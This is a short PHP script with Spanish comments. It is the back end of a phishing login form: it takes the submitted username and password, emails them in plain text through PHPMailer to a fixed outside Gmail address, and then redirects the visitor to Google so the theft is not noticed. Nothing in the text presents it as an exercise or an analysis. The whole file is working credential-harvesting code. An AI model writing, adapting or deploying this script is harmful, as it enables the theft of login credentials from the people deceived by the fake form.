<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Incluir la clase PHPMailer
require 'ruta/donde/instalaste/PHPMailer/src/Exception.php';
require 'ruta/donde/instalaste/PHPMailer/src/PHPMailer.php';
require 'ruta/donde/instalaste/PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST["usuario"];
    $contrasena = $_POST["contrasena"];

    // Puedes personalizar el contenido del correo según tus necesidades
    $mensaje = "Usuario: $usuario\nContraseña: $contrasena";

    // Configurar PHPMailer
    $mail = new PHPMailer(true);
    try {
        // Configuración del servidor SMTP
        $mail->isSMTP();
        $mail->Host = 'tu_servidor_smtp';
        $mail->SMTPAuth = true;
        $mail->Username = 'tu_correo';
        $mail->Password = 'tu_contraseña';
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        // Configuración del remitente y destinatario
        $mail->setFrom('tu_correo', 'Tu Nombre');
        $mail->addAddress('lautiroca2@gmail.com', 'Destinatario');

        // Configuración del mensaje
        $mail->Subject = 'Datos de inicio de sesión';
        $mail->Body = $mensaje;

        // Enviar el correo
        $mail->send();

        // Redirigir a la página de Google después de enviar el correo
        header("Location: https://www.google.com");
        exit();
    } catch (Exception $e) {
        echo "Error al enviar el correo: {$mail->ErrorInfo}";
    }
}
?>
